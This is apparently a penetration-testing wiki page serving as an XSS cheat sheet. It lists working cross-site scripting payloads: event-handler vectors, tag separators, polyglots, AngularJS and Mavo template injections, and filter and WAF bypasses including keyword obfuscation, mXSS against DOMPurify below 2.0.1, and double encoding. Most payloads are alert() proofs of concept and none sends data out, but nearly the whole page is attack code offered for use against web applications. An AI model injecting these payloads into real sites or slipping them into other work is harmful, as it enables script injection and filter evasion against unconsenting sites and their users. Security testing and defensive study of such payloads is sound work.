---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# XSS

For API-specific XSS payloads, I highly recommend the following resources:&#x20;

### Payload Box XSS payload list&#x20;

This list contains over 2,700 XSS scripts that could trigger a successful XSS attack (https://github.com/payloadbox/ xss-payload-list).&#x20;

### Wfuzz wordlist&#x20;

A shorter wordlist included with one of our primary tools. Useful for a quick check for XSS (https://github.com/xmendez/wfuzz/ tree/master/wordlist).&#x20;

### NetSec.expert XSS payloads&#x20;

Contains explanations of different XSS payloads and their use cases. Useful to better understand each payload and conduct more precise attacks (https://netsec.expert/posts/xss-in-2020).

Here's a fresh XSS cheat sheet: focused on practical techniques, tips, and examples to bypass WAFs and filters for complex injections. It's built with current methods, aiming to be genuinely helpful in real-world situations.

## Tag-attribute separators  <a href="#tag-attribute-separators" id="tag-attribute-separators"></a>

Sometimes filters naively assume only certain characters can separate a tag and its attributes, here’s a full list of valid separators that work in firefox and chrome:

| Decimal value | URL Encoded | Human desc      |
| ------------- | ----------- | --------------- |
| 47            | %2F         | Foward slash    |
| 13            | %0D         | Carriage Return |
| 12            | %0C         | Form Feed       |
| 10            | %0A         | New Line        |
| 9             | %09         | Horizontal Tab  |

**Usage**

Basically, if you have a payload that looks like:

```html
<svg onload=alert(1)>
```

You can try to replace the space between ‘svg’ and ‘onload’ with any of those chars and still work like you expect it to:

So, these are all valid HTML and will execute (demo: [valid html ](https://jsfiddle.net/z9fxpd8L/10/)):

```html
<svg/onload=alert(1)><svg>
<svg
onload=alert(1)><svg> # newline char
<svg	onload=alert(1)><svg> # tab char
<svgonload=alert(1)><svg> # new page char (0xc)
```

## JavaScript event based XSS <a href="#javascript-event-based-xss" id="javascript-event-based-xss"></a>

Good reference for more events: [More HTML events](https://developer.mozilla.org/en-US/docs/Web/Events)

### **Standard HTML events**

(0-click only)

| Name             | Tags                                                         | Note                                                                                                                     |
| ---------------- | ------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------ |
| onload           | body, iframe, img, frameset, input, script, style, link, svg | Great for 0-click, but super commonly filtered                                                                           |
| onpageshow       | body                                                         | Great for 0-click, but appears only usable in Non-DOM injections                                                         |
| onfocus          | most tags                                                    | for 0-click: use together with autofocus=""                                                                              |
| onmouseover      | most tags                                                    | if possible, add styling to make it as big as possible. It’s technically a 0-click if you don’t have to click, right? /s |
| onerror          | img, input, object, link, script, video, audio               | make sure to pass params to make it fail                                                                                 |
| onanimationstart | Combine with any element that can be animated                | Fired then a CSS animation starts                                                                                        |
| onanimationend   | Combine with any element that can be animated                | Fires when a CSS animation ends                                                                                          |
| onstart          | marquee                                                      | Fires on marquee animation start - Firefox only?                                                                         |
| onfinish         | marquee                                                      | Fires on marquee animation end - Firefox only?                                                                           |
| ontoggle         | details                                                      | Must have the ‘open’ attribute for 0-click                                                                               |

Examples:

```html
<body onload=alert()>
<img src=x onerror=alert()>
<svg onload=alert()>
<body onpageshow=alert(1)>
<div style="width:1000px;height:1000px" onmouseover=alert()></div>
<marquee width=10 loop=2 behavior="alternate" onbounce=alert()> (firefox only)
<marquee onstart=alert(1)> (firefox only)
<marquee loop=1 width=0 onfinish=alert(1)> (firefox only)
<input autofocus="" onfocus=alert(1)></input>
<details open ontoggle="alert()">  (chrome & opera only)
```

### **HTML5 events**

(0-click only)

| Name             | Tags         | Note                                                                                      |
| ---------------- | ------------ | ----------------------------------------------------------------------------------------- |
| onplay           | video, audio | For 0-click: combine with autoplay HTML attribute and combine with valid video/audio clip |
| onplaying        | video, audio | For 0-click: combine with autoplay HTML attribute and combine with valid video/audio clip |
| oncanplay        | video, audio | Must link to a valid video/audio clip                                                     |
| onloadeddata     | video, audio | Must link to a valid video/audio clip                                                     |
| onloadedmetadata | video, audio | Must link to a valid video/audio clip                                                     |
| onprogress       | video, audio | Must link to a valid video/audio clip                                                     |
| onloadstart      | video, audio | Great underexploited 0-click vector                                                       |
| oncanplay        | video, audio | Must link to a valid video/audio clip                                                     |

Examples:

| <pre class="language-html"><code class="lang-html">&#x3C;video autoplay onloadstart="alert()" src=x>&#x3C;/video>
&#x3C;video autoplay controls onplay="alert()">&#x3C;source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4">&#x3C;/video>
&#x3C;video controls onloadeddata="alert()">&#x3C;source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4">&#x3C;/video>
&#x3C;video controls onloadedmetadata="alert()">&#x3C;source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4">&#x3C;/video>
&#x3C;video controls onloadstart="alert()">&#x3C;source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4">&#x3C;/video>
&#x3C;video controls onloadstart="alert()">&#x3C;source src=x>&#x3C;/video>
&#x3C;video controls oncanplay="alert()">&#x3C;source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4">&#x3C;/video>
&#x3C;audio autoplay controls onplay="alert()">&#x3C;source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4">&#x3C;/audio>
&#x3C;audio autoplay controls onplaying="alert()">&#x3C;source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4">&#x3C;/audio>
</code></pre> |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |

### **CSS-based events**

Unfortunately, true XSS through CSS appears dead. All the vectors I’ve attempted only work on extremely old browsers. So what we’ve got is XSS that triggers based on CSS unless you feel like arguing with devs that an IE8 or old opera vulnerability is still a valid risk.

Note: Below uses style tags to set up keyframes for animation(start|end), but you can also check for already included CSS to reuse what’s already there.

| <pre class="language-html"><code class="lang-html">&#x3C;style>@keyframes x {}&#x3C;/style>
</code></pre> |
| --------------------------------------------------------------------------------------------------------- |

```html
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>
```

#### Weird XSS vectors <a href="#weird-xss-vectors" id="weird-xss-vectors"></a>

Just some odd/weird vectors that I don’t see mentioned often.

```html
<svg><animate onbegin=alert() attributeName=x></svg>
<object data="data:text/html,<script>alert(5)</script>">
<iframe srcdoc="<svg onload=alert(4);>">
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
```

### XSS Polyglots  <a href="#xss-polyglots" id="xss-polyglots"></a>

I use several XSS polyglots because sometimes you only have a certain # of characters to input and need a DOM or non-DOM based one.\
Don’t rely on these as there are circumstances they will fail, but if you’re fuzzing everything then polyglots can give okay coverage.

| # chars | Usage   | Polyglots                                                                                                                                         |
| ------- | ------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| 141     | Both    | ``javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>`` |
| 88      | Non-DOM | `"'--></noscript></noembed></template></title></textarea></style><script>alert()</script>`                                                        |
| 95      | DOM     | `'"--></title></textarea></style></noscript></noembed></template></frameset><svg onload=alert()>`                                                 |
| 54      | Non-DOM | `"'>-->*/</noscript></ti tle><script>alert()</script>`                                                                                            |
| 42      | DOM     | `"'--></style></script><svg onload=alert()>`                                                                                                      |

#### Frameworks <a href="#frameworks" id="frameworks"></a>

To attack JS Frameworks, always do research on the relevant templating language.

**AngularJS**

| <pre class="language-html"><code class="lang-html">{% raw %}
{{constructor.constructor('alert(1)')()}}
{% endraw %}
</code></pre> |
| --------------------------------------------------------------------------------------------------------------------------------- |

That payload works in most cases, but [this great resource](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs) has a bunch of other recommendations for various versions you may want to try.

**Mavo**

```html
[self.alert(1)]
```

### XSS Filter Bypasses <a href="#xss-filter-bypasses" id="xss-filter-bypasses"></a>

**Parenthesis filtering**

Abusing HTML parsers and JS Syntax:

```html
<svg onload=alert`1`></svg>
<svg onload=alert&lpar;1&rpar;></svg>
<svg onload=alert&#x28;1&#x29></svg>
<svg onload=alert&#40;1&#41></svg>
```

**Restricted charset**

These 3 sites will transform valid JS to horrible monstrosities that have a good shot at bypassing a lot of filters:

* [JSFuck](http://www.jsfuck.com/)
* [JSFsck – JSFuck without parentheses](https://github.com/centime/jsfsck)
* [jjencode](http://utf-8.jp/public/jjencode.html)

**Keyword filtering**

Avoiding keywords:

```html
(alert)(1)
(1,2,3,4,5,6,7,8,alert)(1)
a=alert,a(1)
[1].find(alert)
top["al”+”ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)  // Generated using parseInt("alert",30). Other bases also work
```

**mXSS and DOM Clobbering**

It’s basically impossible for XSS filters to correctly anticipate every way that HTML will be mutated by a browser and interacting libraries, so what happens is that you can sometimes sneak a XSS payload in as invalid HTML and the browser will correct it into a valid payload… which bypasses the filter.

mXSS paper with lots of details: [here](https://cure53.de/fp170.pdf)\
Talk with good info on clobbering: [here](https://www.youtube.com/watch?v=5W-zGBKvLxk)

mXSS payload that bypasses one of the most commonly used filters:\
[DOMPurify <2.0.1](https://research.securitum.com/dompurify-bypass-using-mxss/)

```html
 <svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
 <svg><p><style><a id="</style><img src=1 onerror=alert(1)>"></p></svg>
```

**Double encoding**

Simple enough, sometimes an application will perform XSS filtering on a string before it’s decoded once more, which leaves it open by filter bypasses. It’s pretty rare, but some bug hunters I know swear by it so I’m including it for reference.

| Char | Double encoded |
| ---- | -------------- |
| <    | %253C          |
| >    | %253E          |
| (    | %2528          |
| )    | %2529          |
| "    | %2522          |
| '    | %2527          |

**General tips**

* VaRy ThE capItaliZatiOn. Sometimes a regex or other custom-made filters do case sensitive matching.
* Practice your XSS skills on CTFs like [Pwnfunction’s XSS CTF](https://xss.pwnfunction.com/) . You will likely learn techniques you did not know existed.

#### Resources <a href="#resources" id="resources"></a>

Great other resources:

[Fantastic collection of somewhat old XSS stuff](https://www.vulnerability-lab.com/resources/documents/531.txt)\
[Portswigger XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)\
[Portswigger XSS through Frameworks](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)\
[https://netsec.expert/posts/](https://netsec.expert/posts/)
